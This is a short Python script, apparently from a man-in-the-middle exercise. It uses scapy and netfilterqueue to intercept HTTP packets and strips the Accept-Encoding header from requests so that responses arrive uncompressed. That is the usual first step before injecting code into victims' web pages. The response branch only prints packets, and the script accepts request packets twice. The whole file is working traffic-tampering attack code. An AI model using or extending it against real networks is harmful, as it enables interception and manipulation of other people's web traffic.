#!/usr/bin/env python


import scapy.all as scapy

import netfilterqueue
import re


def replace_load(scapy_packet,load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):

        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            print(scapy_packet.show())
            new_load=re.sub("Accept-Encoding.*?\\r\\n" , "" , scapy_packet[scapy.Raw].load)
            replace_load(scapy_packet,new_load)
            packet.set_payload(str(scapy_packet))
            packet.accept()

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            print(scapy_packet.show())

        packet.set_payload(str(scapy_packet))

        packet.accept()
    else:
        packet.accept()


queue = netfilterqueue.NetfilterQueue()

queue.bind(0, process_packet)

queue.run()
